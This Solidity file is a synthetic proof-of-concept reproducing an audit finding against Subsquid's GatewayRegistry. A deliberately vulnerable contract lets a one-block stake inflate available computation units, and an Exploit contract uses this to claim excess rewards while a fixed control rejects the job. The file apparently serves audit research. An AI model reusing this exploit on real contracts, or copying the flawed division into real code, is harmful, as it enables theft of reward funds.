// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Subsquid GatewayRegistry.computationUnitsAvailable (Pashov H-02).
    SYNTHETIC, cheatcode-free. A 1-block stake of 10 units is reported as 50
    because epochLength is 5. A 40-unit job is accepted and 40 reward tokens
    are released. The real cap is 10, so the control rejects the job. */

contract Reward {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Gateway {
    uint256 public constant EPOCH = 5;
    Reward public reward;
    bool public useReal;
    uint256 public computationUnits;
    uint256 public lockStart;
    uint256 public lockEnd;
    uint256 public lastAvailable;
    uint256 public accepted;

    constructor(Reward _reward, bool _useReal) {
        reward = _reward;
        useReal = _useReal;
    }

    function stake(uint256 units, uint256 duration) external {
        computationUnits = units;
        lockStart = block.number;
        lockEnd = block.number + duration;
    }

    function computationUnitsAvailable() public view returns (uint256 total) {
        if (lockStart <= block.number && lockEnd > block.number) {
            // @> VULN: duration shorter than an epoch inflates units. 10 * 5 / 1 = 50.
            total = (computationUnits * EPOCH) / (lockEnd - lockStart);
        }
    }

    function acceptJob(uint256 units) external returns (uint256 paid) {
        uint256 cap = useReal ? computationUnits : computationUnitsAvailable();
        lastAvailable = cap;
        require(cap >= units, "no units");
        accepted = units;
        paid = units * 1e18;
        reward.mint(msg.sender, paid);
    }
}

contract Exploit {
    Reward public reward; // nonce 1
    Gateway public gate; // nonce 2
    Gateway public fair; // nonce 3

    uint256 public available;
    uint256 public realUnits;
    uint256 public rewardPaid;
    bool public controlReverted;

    constructor() {
        reward = new Reward();
        gate = new Gateway(reward, false);
        fair = new Gateway(reward, true);
    }

    function run() external {
        gate.stake(10, 1);
        fair.stake(10, 1);
        available = gate.computationUnitsAvailable();
        realUnits = gate.computationUnits();
        rewardPaid = gate.acceptJob(40);
        try fair.acceptJob(40) {
            controlReverted = false;
        } catch {
            controlReverted = true;
        }
        require(realUnits == 10, "real units");
        require(available == 50, "inflated units");
        require(gate.accepted() == 40, "job accepted");
        require(rewardPaid == 40e18, "40 reward released");
        require(controlReverted, "control accepted the job");
        require(fair.accepted() == 0, "control paid");
    }
}
